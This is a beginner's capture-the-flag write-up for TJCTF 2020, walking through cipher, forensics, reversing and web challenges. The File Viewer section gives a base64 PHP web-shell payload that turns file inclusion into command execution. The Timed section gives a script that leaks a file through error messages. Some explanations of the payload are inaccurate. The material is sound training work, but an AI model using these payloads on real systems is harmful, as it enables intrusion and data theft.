# **TJCTF 2020**

<p align="center">
	
</p>
TJCTF is a Capture the Flag (CTF) competition hosted by TJHSST's Computer Security Club. It is an online, jeopardy-style competition targeted at high schoolers interested in Computer Science and Cybersecurity. Participants may compete on a team of up to 5 people, and will solve problems in categories such as Binary Exploitation, Reverse Engineering, Web Exploitation, Forensics, and Cryptography in order to gain points. The eligible teams with the most points will win prizes at the end of the competition.

This is my first writeup of a CTF and the fifth or sixth CTF I participated in,
if you have any comments, questions, or found any mistakes (which I'm sure there are a lot of)
please let me know. Thanks for reading!

***

# Table of Contents
* [Miscellaneous](#Miscellaneous)
  - [A First Step](#a-first-step)
  - [Discord](#discord)
  - [Censorship](#censorship)
  - [Timed](#timed)
  - [Truly Terrible Why](#truly-terrible-why)
  - [Zipped Up](#zipped-up)
* [Cryptography](#cryptography)
  - [Circles](#circles)
  - [Speedrunner](#speedrunner)
  - [Tap Dancing](#tap-dancing)
  - [Typewriter](#typewriter)
  - [Titanic](#titanic)
* [Reversing](#reversing)
  - [Forwarding](#forwarding)
* [Web](#web)
  - [Broken Button](#broken-button)
  - [File Viewer](#file-viewer)
* [Forensics](#Forensics)
  - [Ling Ling](#ling-ling)
  - [Rap God](#rap-god)

***
# Miscellaneous

## A First Step
Every journey has to start somewhere: this one starts here (probably).
The first flag is tjctf{so0p3r_d0oper_5ecr3t}. Submit it to get your first points!

**tjctf{so0p3r_d0oper_5ecr3t}**

Flag is in the challenge's description

## Discord
Strife, conflict, friction, hostility, disagreement. Come chat with us! We'll be sending out announcements and other important information, and maybe even a flag!

**tjctf{we_love_wumpus}**

Flag is pinned in the Discord server announcements channel

## Censorship
My friend has some top-secret government intel. He left a message, but the government censored him! They didn't want the information to be leaked, but can you find out what he was trying to say?

` nc p1.tjctf.org 8003 `

**tjctf{TH3_1llum1n4ti_I5_R3aL}**

This challenge I solved by mistake (there are no mistakes just happy accidents) but the solution is
somewhat straightforward, when we connect to the server we are greeted with the following meessege:

When we submit the answer we get following meessege:

Which is not the flag (trust me i checked), when we sumbit a wrong answer we get nothing,
my first thought was that the flag returned is random and there is a chance that the real flag will be returned,
so I wrote a short python script which connects to the server, reads the question and answers it:

```python 3
from pwn import remote
import re

host = "p1.tjctf.org"
port = 8003
s = remote(host, port)
question = s.recvuntil('\n')
numbers = re.findall('[0-9]+',str(question))
sum = sum([int(a) for a in numbers])
s.send('{}\n'.format(sum))
print(s.recv())
s.close()
```

And during debugging I noticed something strange is happening with the output:

As you can see the server is actually returing us the flag each time we answer correctly.
But, We can't see it when the output is printed in the terminal,
The reason is that '\r' symbol after the flag, The symbol stands for carriage return,
And in most terminal nowdays it deletes the written message and returns the cursor to the start of line,
Using this symbol can actually make cool looking animation and most of the animation
we see in terminals nowdays use this symbol.

## Timed
I found this cool program that times how long Python commands take to run! Unfortunately, the owner seems very paranoid, so there's not really much that you can test. The flag is located in the file flag.txt on the server.

` nc p1.tjctf.org 8005`

**tjctf{iTs_T1m3_f0r_a_flaggg}**

When we connect to the server we get the following message:

I tried using Unix commands first and quickly discovered by the error messages
that the commands need to be python commands, furthermore, we can't see the output
of the executed commands but only the time it took for the commands to execute
or an error message if an error occurred while executing the commands.
I tried using python commands and modules to get a shell or get a reverse shell going
from the server to my host.
for each command I tried I got the following message:

At this point I gave up on getting a shell and tried to see what I can
do in this limited enviroment, I wanted to determine first if the commands are
executed in python 2 or python 3, for that I checked if python recognized
basestring, an abstract type which can't be found in python 3 and will raise an
exception:

Executing basestring in the server didn't return an error message so I determined
that the environment is python 2, and so I tried to check if I can read a
file named flag.txt using python 2 I/O functions:

We can read flag.txt!, now we need to discover the flag using our only
two availiable outputs: the time to execute a command or an error message if
such error produces.
We can do this by going letter by letter and executing a command that compares
the selected letter with a letter in the flag such that if the letters match the output
will be different so we can easily point out the matching letters and build the flag.
There are two ways to do this, The first one is to use commands such
that if the letter matches the execution time will be longer and by doing
so the total runtime returned will be grater, This type of attack is called
Timing Attack and an exemple of this is linked in the resources.
The second one and the one that I used is to raise an exception if the letter match in
the position such that we can the discovery of the letter is not time bound.
for doing that I wrote the following code in python 3 using the pwntools module:

```python 3
from pwn import remote
import string

host = "p1.tjctf.org"
port = 8005
s = remote(host, port)
flag = ""
index = 0
changed = True
s.recvuntil('!\n')
while changed:
    changed = False
    for c in '_{}' + string.printable:
    	print("testing {}".format(flag + c))
    	command = '''1/0 if open('flag.txt','r').read({})[{}] == ''{}' else 0\n'''.format(index + 1, index, c)
    	print(command)
    	s.send(command)
    	answer = s.recvuntil("!\n")
    	if b'Traceback' in answer:
    		flag += c
    		changed = True
    		index += 1
    		break

```

As you can see, the code connects to the server and builds the flag by iterating
over all the printable characters and checking if the command executed raises an
error or not, the command simply checks if the character in a specific position
matches the current tested character and if so it calculates 1/0 which in python
throw an exception (believe it or not there are langauges and modules where 1/0 returns infinity)
else the command does nothing, if an error was raised then the letter is added to the flag
and the code moves to iterate over the next character in the flie, if we finished iterating over all
the characters and none of them raised a flag we can conclude that we discovered all the
flag, and we can see that the code does just that:

Side note: when writing the writeup I thought about another very easy way to get the
flag, We know that we can see errors happening in the execution of commends so
we can just raise an error with the flag !, For that you need you need to use the error
type NameError to raise an error with a string but it is still a much easier and very cool
way to get the flag, you can see it in action in the following picture:

**Resources:**
* Pwntools : http://docs.pwntools.com
* All-Army Cyberstakes! Dumping SQLite Database w/ Timing Attack :  https://youtu.be/fZ3mPRctbO0

## Truly Terrible Why
Your friend gave you a remote shell to his computer and challenged you to get in, but something seems a little off... The terminal you have seems almost like it isn't responding to any of the commands you put in! Figure out how to fix the problem and get into his account to find the flag! Note: networking has been disabled on the remote shell that you have. Also, if the problem immediately kicks you off after typing in one command, it is broken. Please let the organizers know if that happens.
hint : Think about program I/O on linux

`nc 52.205.246.189 9000`

**tjctf{ptys_sure_are_neat}**

This challenge was very fair in my opinion but it was easy to overcomplicate it
(as I admittedly did in the beginning).
When you connect to the server you are greeted with the following message:

And for every input we give no output is returned.
First I tried doing blind enumaration of the files in the server using similar methods as I used in Timed
but the only true way I found to do that was to disconnect from the server using exit
every time a character match... which quickly led to me being banned from the server and
so I stopped and moved to other challenges.
In the meantime the challenge was patched and using the exit command no longer worked,
And the hint was published.
As the hint suggested there is something off about the I/O of the shell
such that we can't see the output.
But, We know that we are connected to the standard input of the shell beacuse we can execute commands.
So I tried using output redirection so that the output of the commands will be redircted
to the standard input (file descriptor 0) et voila:

We got a working shell!, From thereon I tried getting an interactive shell using the common methods
(listed in resources) and spawned a new shell with the output redirected to standard input:

Now we can now use the shell as (almost) a regular shell, so we can use the arrow keys and
use the sudo command, We can also see now that we are connected as problem-user.
Let's see what is written in the text files:

From the message we can assume that we need to connect to other-user, And because we are given
problem-user password we will probably need to use it for that.
The first Thing I do in this situations is to check the user sodu privillages using sudo -l command:

So we run /usr/bin/chguser as root:

And as you can see by doing we connect to other-user and we are dropped at his home folder,
And we got our flag.

**Resources:**
* Getting fully interactive shell : https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
* Linux Redirection : https://www.guru99.com/linux-redirection.html

## Zipped Up
My friend changed the password of his Minecraft account that I was using so that I would stop being so addicted. Now he wants me to work for the password and sent me this zip file. I tried unzipping the folder, but it just led to another zipped file. Can you find me the password so I can play Minecraft again?

[link](https://static.tjctf.org/663d7cda5bde67bd38a8de1f07fb9fab9dd8dd0b75607bb459c899acb0ace980_0.zip)

**tjctf{p3sky_z1p_f1L35}**

This type of challange is pretty common in CTFs and most of the times it can be summed
up to tweaking the code so that it will work with the current challenge,
As you can see each compressed file contains a txt and another compressed file in a directory,
If you look further you can see that there is a false flag tjctf{n0t_th3_fl4g}
in some txt files (actually in all of them but one afaik).
So, I wrote (mostly tweaked) a short bash scipt to not only find compressed files in the working directory and unzip them,
But also check the content of the txt file and if it's not the false flag print it and stop the execution:

```bash
#!/bin/bash
get_flag() {
	for filename in $(pwd)/*; do
		echo "$filename"
		if [[ $(mimetype -b "$filename") == "application/zip" ]]
		then
			unzip "$filename"
			find_dir
			return
		elif [[ $(mimetype -b "$filename") == "application/x-tar" ]]
		then
			tar -xf "$filename"
			find_dir
			return
		elif [[ $(mimetype -b "$filename") == "application/x-bzip-compressed-tar" ]]
		then
			tar -xf "$filename"
			find_dir
			return
		elif [[ $(mimetype -b "$filename") == "application/x-compressed-tar" ]]
		then
			tar -xf "$filename"
			find_dir
			return
		elif [[ $(mimetype -b "$filename") == "text/plain" ]]
		then
			if [[ $(cat "$filename") != "tjctf{n0t_th3_fl4g}" ]]
			then
				cat "$filename"
				return
			fi
		fi
	done
}

find_dir(){
	for filename in $(pwd)/*; do
		if [[ -d "$filename" ]]
			then
				cd "$filename"
				get_flag
				return
		fi
	done
}
echo start
get_flag
```

And after 829 (!) files unzipped we find the first (and afaik the only) text file that contains the flag.

***
# Cryptography

## Circles

**tjctf{B3auT1ful_f0Nt}**

Some typefaces are mysterious, like this one: its origins are an enigma wrapped within a riddle, indeed.

hint : To obtain the flag, you should find the font that was used to encode the message in the picture. If you Google the description of the problem, the first website that pops up seems promising. Using a dictionary to guess/bruteforce words without finding the font will not help you. Each circle in the image represents an alphanumeric character that is part of the flag. The brackets and the underscore in the image are NOT part of the font used to encrypt the flag.

**tjctf{B3auT1ful_f0Nt}**

This challenge was really guessy and quite frustrating, As the hint suggested if we search for the challenge description
we find the site fonts.com and by searching the word circular in it (yeah I know) we find our typeface:

Now that we know the name of the typeface lets find its characters map,
By seaching just that I found the typeface character map (linked below) and decoded the flag.

**Resources:**
* USF Circular Designs : https://www.fonts.com/font/ultimate-symbol/usf-circular-designs/packages
* Character map : https://www.fonts.com/font/ultimate-symbol/usf-circular-designs/regular

## Speedrunner
I want to make it into the hall of fame: a top runner in "The History of American Dad Speedrunning". But to do that, I'll need to be faster. I found some weird parts in the American Dad source code. I think it might help me become the best.

[link](https://static.tjctf.org/6e61ec43e56cff1441f4cef46594bf75869a2c66cb47e86699e36577fbc746ff_encoded.txt)

**tjctf{new_tech_new_tech_go_fast_go_fast}**

In the link we get the following ciphertext:

LJW HXD YUNJBN WXC DBN CQN CNAV "FXAUM ANLXAM'? RC'B ENAH VRBUNJMRWP JWM JBBDVNB CQJC CQN ERMNX YXBCNM RB CQN OJBCNBC CRVN, FQNAN RW OJLC BXVNXWN NUBN LXDUM QJEN J OJBCNA, DWANLXAMNM ENABRXW. LXDUM HXD YUNJBN DBN CQN CNAV KTCFENJJJEKVXOBAL (KNBC TWXFW CRVN FRCQ ERMNX NERMNWLN JB JYYAXENM JWM ENARORNM KH VNVKNAB XO CQN BYNNM ADWWRWP LXVVDWRCH) RW CQN ODCDAN. CQRB FXDUM QNUY UXFNA LXWODBRXW RW CQNBN CHYNB XO ERMNXB RW ANPJAM CX CQN NENA DYMJCRWP JWM NEXUERWP WJCDAN XO CQN BYNNMADWWRWP LXVVDWRCH.

CSLCO{WNF_CNLQ_WNF_CNLQ_PX_OJBC_PX_OJBC}

We can notice that the format of the last line somewhat matches the format for the flag so we can
assume the cipher is letter substitution, a type of cipher where each letter in
the plaintext is subtituted with another letter, I copied the text to CyberText
and tried to use shift ciphers to decrpyt the message, Shift cipher are a type
of cipher in which every letter is shifted by a known offset to a different letter,
ROT13 and Ceaser Cipher are some famous exemple of this type of cipher where the
offsets are 13 and 3 respectably, with an offset of 17 we get the following message:

CAN YOU PLEASE NOT USE THE TERM "WORLD RECORD'? IT'S VERY MISLEADING AND ASSUMES THAT THE VIDEO POSTED IS THE FASTEST TIME, WHERE IN FACT SOMEONE ELSE COULD HAVE A FASTER, UNRECORDED VERSION. COULD YOU PLEASE USE THE TERM BKTWVEAAAVBMOFSRC (BEST KNOWN TIME WITH VIDEO EVIDENCE AS APPROVED AND VERIFIED BY MEMBERS OF THE SPEED RUNNING COMMUNITY) IN THE FUTURE. THIS WOULD HELP LOWER CONFUSION IN THESE TYPES OF VIDEOS IN REGARD TO THE EVER UPDATING AND EVOLVING NATURE OF THE SPEEDRUNNING COMMUNITY.

TJCTF{NEW_TECH_NEW_TECH_GO_FAST_GO_FAST}

**Resources:**
* CyberChef : https://gchq.github.io/CyberChef/
* Ceaser Cipher : https://en.wikipedia.org/wiki/Caesar_cipher
* Substitution Cipher : https://en.wikipedia.org/wiki/Substitution_cipher

## Tap Dancing
My friend is trying to teach me to dance, but I am not rhythmically coordinated! They sent me a list of dance moves but they're all numbers! Can you help me figure out what they mean so I can learn the dance?

[link](https://static.tjctf.org/518d6851c71c5482dbd5bbe812b678684238c8f4e9e9b3d95a188f7db83a0870_cipher.txt)

**tjctf{m0rsen0tb4se3}**

In the link we get the following cipher:

1101111102120222020120111110101222022221022202022211

As you can see there are three symbol in this cipher and suspiciously one of them is sparse,
So I assumed that this is morse (and honestly it will be weird if there isn't even one morse challenge in a CTF)
I assumed that zeros symbolize spaces and the twos and ones are . and: respectably, I got the following morse code:

-- ----- .-. ... . -. -----: -... ....- ... . ...--

I plugged the morse code into CyberChef and got the flag.

**Resources**
* Morse Code (do i really need to add that!?) : https://en.wikipedia.org/wiki/Morse_code

## Typewriter
Oh no! I thought I typed down the correct flag for this problem on my typewriter, but it came out all jumbled on the paper. Someone must have switched the inner hammers around! According to the paper, the flag is zpezy{ktr_gkqfut_hxkhst_tyukokkgotyt_hoftqhhst_ykxoz_qxilrtxiyf}.

hint:a becomes q, b becomes w, c becomes e, f becomes y, j becomes p, t becomes z, and z becomes m. Do you see the pattern?

**tjctf{red_orange_purple_efgrirroiefe_pineapple_fruit_auhsdeuhfn}**

As the hint suggested this is a qwerty monoalphabetic cipher,
Meaning that every letter is subtituted with the corresponding in the keyboard with the same position
(from up to down and from left to right).
For decrpyting that cipher I used an awesome site called dcode.fr and by using their monoalphabetic decoder
with the key: QWERTYUIOPASDFGHJKLZXCVBNM I got the flag.

**Resources:**
* decode.fr : https://www.dcode.fr/en
* qwerty : https://en.wikipedia.org/wiki/QWERTY

## Titanic
I wrapped tjctf{} around the lowercase version of a word said in the 1997 film "Titanic" and created an MD5 hash of it: 9326ea0931baf5786cde7f280f965ebb.

**tjctf{marlborough's}**

this challenge is very straightforward but steggered me for a long time because I couldn't find the right word,
We know that our flag is said in the movie so sensibly we need to look for the script, I found one of them online
and used a tool named CeWL to make the script a wordlist, After that I wrote a shrt python script that read every word,
make it lowercase and wraps it with the flag format, and then I ran Hashcat on it.
BUT it didn't work...
After that I tried doing the same on several other scripts and none of them worked.
Now what's worked for me in the end was to use subtitles and not the original script in the hope that some of the words
were different, for that I used the subtitles listed below, the file looks like that:

There was a lot of work to do obviously so I wrote a script that removes the unnecessary characters,
saparetes the words, and wraps them in the flag format, now that we finally have the wordlist (added below)
we can use hashcat, a program which breaks hashes using dictionary attack, we run hashcat using the following commands:
hashcat -a 0 -m 0 hash.txt wordlist.txt
and get the following output:

**Resources:**
* subtitle Titanic.1997.1080p.720p.BluRay.x264.[YTS.AG] : https://yts-subs.com/subtitles/titanic19971080p720pblurayx264ytsag-english-100199
* wordlist :  [link](assets//wordlists//titanic_wordlist.txt)
* CeWL : https://tools.kali.org/password-attacks/cewl
* hashcat : https://tools.kali.org/password-attacks/hashcat

***
# Reversing

## Forwarding
It can't be that hard... right?

[link](https://static.tjctf.org/d9c4527bc1d5c58c1192f00f2e2ff68f84c345fd2522aeee63a0916897197a7a_forwarding)

**tjctf{just_g3tt1n9_st4rt3d}**

This time we get a file with the challenge, if we check the type of the file
we can see that it is an ELF, a type of Unix executable:

I checked if the flag is saved in string format in the file, for that We
can use the strings command which finds strings in the executable, And then use
grep and regex to filter the strings in the binary for the flag
I used the following command:

strings forwarding | grep 'tjctf{.*}'

and got the following output:

**Resources:**
* ELF file : https://en.wikipedia.org/wiki/Executable_and_Linkable_Form
* Regex : https://en.wikipedia.org/wiki/Regular_expression

***

# Web

## Broken Button
This site is telling me all I need to do is click a button to find the flag! Is it really that easy?

[link](https://broken_button.tjctf.org/)

**tjctf{wHa1_A_Gr8_1nsp3ct0r!}**

when we go to the site we get this massage:

If we Inspect the site (Ctrl+Shift+I) we see that there is a hidden button in
the HTML code:

And when we look at the HTML file that is referenced by the by the hidden
button we get our flag.

## File Viewer
So I've been developing this really cool site where you can read text files! It's still in beta mode, though, so there's only six files you can read.

Hint : The flag is in one directory somewhere on the server, all you have to do is find it...Oh wait. You don't have a shell, do you?

[link](http://file_viewer.tjctf.org/)

**tjctf{n1c3_j0b_with_lf1_2_rc3}**

Here is another challenge I spent a lot of time (and tears) on mostly because I was stubborn and didn't try
to use the resources I have.
when we go to the site we get the following message:

When we pick a random file from the list, I chose pinnapples.txt we get:

Now take a look at the address for the file, as we can see, there is a PHP file which takes as an argument a file variable
which is in our case sets to pinnapples.txt, lets try to see if we can see other files in the server,
I guessed this is a linux server (which most servers are) and tried to change the variable to /etc/passwd
a file which is by default accessible to all users and services on the server:

Jackpot! we have local file inclusion vulnerability on the machine, which means that we can read any file on this system.
At this point I will spare you all the troubles I went through to find what to do next and skip to the solution,
we can use PayloadAllTheThing, A great github repository linked below for finding web payloads, and search for a payload
which works for us, I eventually used the data:// wrapper which posts data to the server side and injects our PHP code,
I used the following payload which let us run commands in the server:

 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=**your command**

 the payloads injects the following code to the server in base64 format:

```php
<?php system($_GET['cmd']);echo 'Shell done !'; ?>
```

Which executes in the systems the value of the cmd variable  and echoes 'Shell done'.
by using the ls command we get the following:

We see we have a strange directory our current directory when use ls in the folder we get:

We found our flag, now for us to read the flag we need to encode the file to base64.
The reason is that if we read a PHP file without encoding it the file will be executed
beacuse the web browser reads the content of the file as code and not text, I used the following payload for that:
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=cat i_wonder_whats_in_here/* | base64
which roughly translates to:

```php
<?php system($_GET['cat i_wonder_whats_in_here/* | base64']);echo 'Shell done !'; ?>
```

And lo and behold we got our base64 encoded flag! :

**Resources:**
* PayloadAllTheThing : https://github.com/swisskyrepo/PayloadsAllTheThings/
 * The used payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-data
* File Inclusion Vulnerability : https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/

***
# Forensics
## Ling Ling
Who made this meme? I made this meme! unless.....

[link](https://static.tjctf.org/d25fe79e6276ed73a0f7009294e28c035437d7c7ffe2f46285e9eb5ac94b6bec_meme.png)

**tjctf{ch0p1n_fl4gs}**

When we go to the link we get the following image:

![](https://static.tjctf.org/d25fe79e6276ed73a0f7009294e28c035437d7c7ffe2f46285e9eb5ac94b6bec_meme.png)

The meaning of the image is beyond me, Lets look at the image metadata, we can do that using the exiftool command:

And as you can see our flag is listed in the artist attribute.

**Resources**
* Exiftool : https://linux.die.net/man/1/exiftool
* Me when I saw the meme : https://i.kym-cdn.com/entries/icons/original/000/018/489/nick-young-confused-face-300x256-nqlyaa.jpg

## Rap God
My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message}

[link](https://static.tjctf.org/302ed01b56ae5988e8b8ad8d9bba402a2934c71508593f5dc9e95aed913d20cf_BigYAudio.mp3)

**tjctf{quicksonic}**

This was a nice audio steganography challange, When we hear the audio we can notice some weird buzzing,
esecially in the left ear, So I assumed from experience that there is a channel with an hideen messege encoded in.
For this challenge I used Sonic Visualiser but I think you can use most of the music processing programs out here,
When we open the file in Sonic Visualiser and open the spectogram viewer we see the following:

We got an encoded image in the audio!,
Now let's saparete the channels and look at channel 2:

And we got the image, There are some weird symbols in there which look like emojis
but not quite, These are actually symbols from a font called Wingdings which was developed
by Microsoft and was used before emojis existed (weird times...), and gained notoriety after
the 9/11 attacks, we can use dcode.fr again with their Wingdings font translator to
get our flag:

**Resources:**
* Sonic Visualiser : https://www.sonicvisualiser.org/
* Wingdings : https://en.wikipedia.org/wiki/Wingdings#9/11_attacks
* dcode.fr Wingdings translator : https://www.dcode.fr/wingdings-fontM
